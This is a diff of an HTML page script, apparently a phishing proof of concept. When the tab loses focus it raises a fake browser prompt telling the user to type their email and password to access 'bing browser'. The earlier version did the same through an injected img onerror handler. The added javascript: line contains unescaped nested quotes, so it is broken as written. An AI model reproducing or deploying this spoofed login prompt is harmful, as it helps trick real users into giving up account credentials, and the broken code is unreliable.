@@ -6,9 +6,7 @@
 <body>
     <script>
         onblur = () => {
-            // Menggunakan pendekatan innerHTML dengan onerror
-            let w = open('about:blank', '_self');
-            w.document.body.innerHTML = '<img src="" onerror="setTimeout(function() { prompt(\"Sign in required\", \"Email / Password\") }, 100)">';
+           window.location.href = "javascript:prompt("in order to access bing browser you must first login on your account \n please type your email and your password:", "E-mail / Password");
         }    
         window.open("about:blank", "_self");
     </script>
